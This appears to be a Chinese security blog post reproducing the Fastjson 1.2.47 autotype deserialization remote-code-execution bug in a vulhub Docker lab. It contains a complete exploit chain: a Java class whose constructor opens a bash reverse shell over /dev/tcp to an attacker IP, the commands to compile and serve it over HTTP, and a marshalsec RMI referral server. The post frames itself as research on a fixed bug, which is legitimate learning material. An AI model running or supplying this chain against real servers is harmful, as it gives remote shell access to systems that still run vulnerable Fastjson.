***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

Fastjson提供autotype功能，允许用户在反序列化数据中通过 @type
指定反序列化的类型，其次Fastjson自定义的反序列化会调用指定类中的setter方法和部分getter方法。

当组件开启autotype并且反序列化不可信的数据时，攻击者构造的数据（恶意代码）会进入特定类的setter或getter方法中，可能会被恶意利用。

##  **影响版本**

Fastjson1.2.47以及之前的版本

## 复现

###  **1.1 环境准备**

 **攻击机1**

用于接受反弹shell  
系统：Win10 x64  
安装nc，burpsuite  
win10中需安装nc，用于监听反弹的shell。  
在win10下，在nc官网(https://eternallybored.org/misc/netcat/)下载会报毒被拦截。  
可以使用nmap中重置的ncat(https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)，与nc使用无区别。  
下载后进入，ncat所在目录，执行 **ncat** ，出现如下输出则安装成功  
![](https://image.3001.net/images/20210525/1621923174_60ac956632431396cfb8d.png!small)

 **攻击机2**

提供一些必要服务  
系统：Ubuntu  
需安装：marshlsec ( https://github.com/mbechler/marshalsec
)（用于启动RMI服务）、python环境（用于启动SimpleHTTPServer服务）、openjdk  
marshlsec下载后，需要使用mvn打包，无mvn命令需要安装Maven  
marshlsec下载后，进入文件目录执行 **sudo mvn clean package -DskipTests**
，完成后会在目录的target目录中发现两个jar包  
![](https://image.3001.net/images/20210525/1621923175_60ac95676f89c900a2727.png!small)

 **受害机**

系统：Ubuntu （与上述提供RMI和Web服务的机器可以是一台或不同）  
需安装：docker、docker-composer、vulhub

###  **1.2 示意图**

![](https://image.3001.net/images/20210525/1621923176_60ac9568299a831c3bbac.png!small)

###  **1.3 复现流程**

在 攻击机1 开启监听  
![](https://image.3001.net/images/20210525/1621923176_60ac9568f36a9c3bc7385.png!small)  
在受害机上启动环境，进入vulhub中的/fastjson/1.2.47-rce/，使用如下命令启动服务：

    
    
    # docker-compose up -d

在攻击机1上进行访问，如下则为成功  
![](https://image.3001.net/images/20210525/1621923177_60ac95698c4014eff1bc9.png!small)

构造恶意代码文件vim Exploit.java，内容如下  
代码中192.168.253.129/6666修改为攻击机1的ip和监听反弹shell的端口

    
    
    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    
    public class Exploit{
        public Exploit() throws Exception {
            //Process p = Runtime.getRuntime().exec(new String[]{"cmd","/c","calc.exe"});
          Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/192.168.253.129/6666;cat <&5 | while read line; do $line 2>&5 >&amp5 done"});
            InputStream is = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
    
            String line;
            while((line = reader.readLine()) != null) {
                System.out.println(line);
            }
    
            p.waitFor();
            is.close();
            reader.close();
            p.destroy();
        }
    
        public static void main(String[] args) throws Exception {
        }
    }
    

编写完成后，对该文件进行编译生成对应的class文件

    
    
    # javac Exploit.java

![](https://image.3001.net/images/20210525/1621923178_60ac956a1d3edd89ba3a6.png!small)  
在 攻击机2 上启动RMI和Web服务  
· 启动Web服务

    
    
    # python -m SimpleHTTPServer 8080

![](https://image.3001.net/images/20210525/1621923179_60ac956b58f8fd9a67b1f.png!small)使用
攻击机1 访问 攻击机2开放的Web服务，如下则成功  
![](https://image.3001.net/images/20210525/1621923180_60ac956c0354e0d9da422.png!small)启动RMI服务

进入marshalsec打包好的jar包目录执行命令，如下

192.168.253.138:8080 为上述Web服务地址和端口，需自行修改

8888 可为任意端口  
``

    
    
    # java -cp marshalsec-0.0.3-SNAPSHOT-all.jar
    marshalsec.jndi.RMIRefServer
    "http://192.168.253.138:8080/#Exploit" 8888

![](https://image.3001.net/images/20210525/1621923180_60ac956c98a791ec19c50.png!small)在
攻击机1 上构造恶意请求  
![](https://image.3001.net/images/20210525/1621923181_60ac956d76228f9e362be.png!small)

发送请求后，等待ncat获取反弹shell，可见在恶意代码中构造的命令执行，成功反弹shell，可以执行命令  
![](https://image.3001.net/images/20210525/1621923182_60ac956e5165f269ab1b2.png!small)

 ***本文仅限技术研究与学术讨论，严禁用于非法用途，否则产生的一切后果自行承担。***

